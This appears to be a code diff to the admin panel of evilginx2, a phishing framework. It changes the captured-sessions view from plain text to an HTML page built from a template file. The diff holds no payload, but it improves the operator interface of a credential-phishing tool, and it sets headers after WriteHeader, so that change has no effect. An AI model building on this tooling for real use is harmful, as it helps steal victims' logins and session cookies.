@@ -5,6 +5,8 @@ import (
 	"net/http"
 	"time"
 	"strconv"
+	"fmt"
+	"io/ioutil"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -46,9 +48,12 @@ func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
 		body = AsHTMLTable(cols, rows)
 	}
 
+	b, _ := ioutil.ReadFile("./templates/adminpanel_basic.html")
+	html := fmt.Sprintf(string(b), "Sessions", body)
+
 	w.WriteHeader(http.StatusOK)
-	w.Header().Set("content-type", "text/plain")
-	w.Write([]byte(body))
+	w.Header().Set("content-type", "text/html")
+	w.Write([]byte(html))
 }
 
 func (a *AdminPanel) downloadSession(w http.ResponseWriter, r *http.Request) {
